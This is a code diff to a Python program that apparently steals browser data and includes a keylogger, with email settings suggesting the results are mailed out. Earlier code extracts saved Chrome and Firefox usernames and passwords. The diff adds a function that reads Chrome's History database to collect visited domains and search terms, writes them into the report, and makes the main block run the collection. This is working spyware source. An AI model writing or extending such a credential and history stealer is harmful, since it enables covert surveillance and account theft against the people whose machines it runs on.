@@ -7,6 +7,7 @@ import re
 import os
 import sqlite3
 import requests
+import urllib.parse
 
 EMAIL = None # Set email here
 EMAIL_PASSWORD = None # Set email password here
@@ -100,6 +101,20 @@ class Chrome(Firefox):
 			login_data_dict[url] = [username, password]
 		return login_data_dict
 
+	def chrome_history_data(self):
+		location = self.chrome_file("History")
+		url_dict = {}
+		keywords = self.database_connection(location, "keyword_search_terms", None, "term")
+		urls = self.database_connection(location, "urls", "last_visit_time", "url")
+		
+		keyword = [x[0] for x in set(keywords)]
+
+		for letters in urls:
+			url = urllib.parse.urlsplit(letters[1])[1]
+			
+			if url not in url_dict.values():
+				url_dict[letters[0]] = url
+		return url_dict, keywords
 
 class VulnScan(Chrome):
 	def __init__(self):
@@ -168,6 +183,7 @@ class VulnScan(Chrome):
 
 	def vuln_scanner(self):
 		check_firefox = self.gather_browsers("Program Files")
+		ports = self.windows_open_ports()
 		star = "*" * 75
 
 		if check_firefox:
@@ -208,7 +224,21 @@ class VulnScan(Chrome):
 		for key, value in chrome_login_data.items():
 			username = value[0]
 			self.write_to_file("[+] Username", username, key)
-		self.file_title(star, new_line=2, left=True, right=True)		
+		self.file_title(star, new_line=2, left=True, right=True)
+		self.file_title("[+] Chrome History Data", new_line=2, right=True)
+
+		chrome_history_data, chrome_history_keyword_data = self.chrome_history_data()
+		
+		for key, value in chrome_history_data.items():
+			self.write_to_file(key, value)
+
+		self.file_title(star, new_line=2, left=True, right=True)
+		self.file_title("[+] Chrome Search History", new_line=2, right=True)
+
+		for search in set(chrome_history_keyword_data):
+			self.write_to_file(search[0])
+
+		self.file_title(star, new_line=2, left=True, right=True)
 
 class Keylogger(VulnScan):
 	def __init__(self):
@@ -219,3 +249,5 @@ if __name__ == '__main__':
 	if not EMAIL or not EMAIL_PASSWORD or not SEND_EMAIL_EVERY:
 		print("[-] Must set the Variables required to run program")
 		exit()
+
+	VulnScan().vuln_scanner()
